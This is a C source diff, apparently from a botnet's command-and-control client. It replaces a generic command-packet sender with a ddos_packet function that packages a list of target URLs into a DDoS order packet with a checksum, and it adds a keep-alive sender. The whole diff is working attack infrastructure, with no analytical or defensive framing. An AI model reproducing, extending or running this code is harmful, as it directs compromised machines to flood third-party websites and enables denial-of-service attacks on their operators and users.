@@ -23,10 +23,14 @@ int hello_packet(SOCKET sock, const uint8_t* mac) {
 }
 
 
-int command_packet(SOCKET sock, uint8_t c_type, const char *command) {
-    size_t cmd_len = (command && *command) ? strlen(command) : 0;
+int ddos_packet(SOCKET sock, const char *urls) {
+    if (urls == NULL) {
+        return -1;
+    }
 
-    size_t header_len = offsetof(CommandPacket, command);
+    size_t cmd_len = strlen(urls);
+
+    size_t header_len = offsetof(DDOSPacket, urls);
     size_t pkt_len = header_len + cmd_len;
 
     uint8_t *buffer = malloc(pkt_len);
@@ -34,15 +38,14 @@ int command_packet(SOCKET sock, uint8_t c_type, const char *command) {
         return -1;
     }
 
-    CommandPacket *pkt = (CommandPacket*)buffer;
+    DDOSPacket *pkt = (DDOSPacket*)buffer;
     pkt->size = (uint16_t)pkt_len;
     pkt->version = TCP_VERSION;
-    pkt->type = ADMIN_PACKET_TYPE_COMMAND;
-    pkt->c_type = c_type;
+    pkt->type = ADMIN_PACKET_CTYPE_COMMAND_DDOS;
     pkt->crc = 0;
 
     if (cmd_len) {
-        memcpy(buffer + header_len, command, cmd_len);
+        memcpy(buffer + header_len, urls, cmd_len);
     }
 
     uint8_t crc = crc8_xor(buffer, pkt_len - 1);
@@ -51,5 +54,12 @@ int command_packet(SOCKET sock, uint8_t c_type, const char *command) {
     int sent = send(sock, (const char*)buffer, (int)pkt_len, 0);
 
     free(buffer);
+    return sent;
+}
+
+int keep_alive(SOCKET sock) {
+    unsigned char keep_alive_packet = ADMIN_PACKET_TYPE_KEEP_ALIVE;
+    size_t sent = send(sock, (const char*)&keep_alive_packet, sizeof(keep_alive_packet), 0);
+
     return sent;
 }
